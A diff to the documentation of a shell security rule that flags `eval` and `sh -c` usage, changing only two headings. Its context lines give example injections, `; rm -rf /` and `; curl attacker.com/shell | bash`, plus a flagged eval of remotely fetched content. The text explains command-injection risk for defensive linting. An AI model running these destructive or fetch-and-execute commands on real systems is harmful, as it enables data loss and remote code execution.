@@ -31,7 +31,7 @@ This rule reports an `eval` statement, and a `bash`/`sh`/`zsh`/`ksh`/`dash -c` c
 
 **OWASP ASVS 4.0 – V5.3.8:** Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding. (Applies at Level 1, 2, and 3.)
 
-## Why This Matters
+## Why this matters
 
 `eval` is one of the most dangerous constructs in shell scripting precisely because it grants the programmer the ability to construct commands dynamically, and grants an attacker the same ability. Command injection via `eval` requires no memory corruption or kernel exploits: if the attacker can influence any byte of the evaluated string, they can append `; rm -rf /`, `; curl attacker.com/shell | bash`, or any other command, and it will execute with the full permissions of the running process.
 
@@ -44,7 +44,7 @@ This rule reports an `eval` statement, and a `bash`/`sh`/`zsh`/`ksh`/`dash -c` c
 
 ATT&CK technique T1059.004 (Command and Scripting Interpreter: Unix Shell) covers this class of command injection. Even when the developer believes they control the input, dynamic `eval` is a maintenance hazard, future refactoring may introduce a new code path that feeds external input into the evaluated string without the security implication being recognised.
 
-## What Gets Flagged
+## What gets flagged
 
 ```bash
 eval "$(curl -fsSL https://config.example.internal/env/production)"   # FLAGGED
